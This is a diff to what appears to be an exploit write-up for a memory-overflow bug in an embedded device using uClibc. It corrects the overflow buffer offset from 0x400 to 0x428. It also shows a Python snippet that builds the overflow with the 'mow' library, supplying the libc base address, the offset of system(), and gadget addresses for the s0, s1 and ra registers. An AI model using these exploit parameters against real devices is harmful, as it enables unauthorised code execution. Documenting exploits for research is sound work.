@@ -35,7 +35,7 @@ Other value of importance found through analysis are:
 
 - Base of libuClibc loaded in memory: 0x2aaf8000
 
-- Distance to registers from overflow buffer: 0x400
+- Offset of overflow buffer: 0x428
 
 - Offset to System in libuClibc: 0x53200 (ending 0x00 is the reason for the first gadget, cant send that across.)
 
@@ -44,7 +44,7 @@ Other value of importance found through analysis are:
 ### Generating the Overflow
 ```bash
 >>> import mow
->>> overflow = mow.Overflow(0x400, 9, mow.LITTLE_ENDIAN, 0, 0x2aaf8000, '/runtime/session/')
+>>> overflow = mow.Overflow(0x428, 9, mow.LITTLE_ENDIAN, 0, 0x2aaf8000, '/runtime/session/')
 >>> overflow.s0 = 0x531f8
 >>> overflow.s1 = 0x15b6c
 >>> overflow.ra = 0x57d60
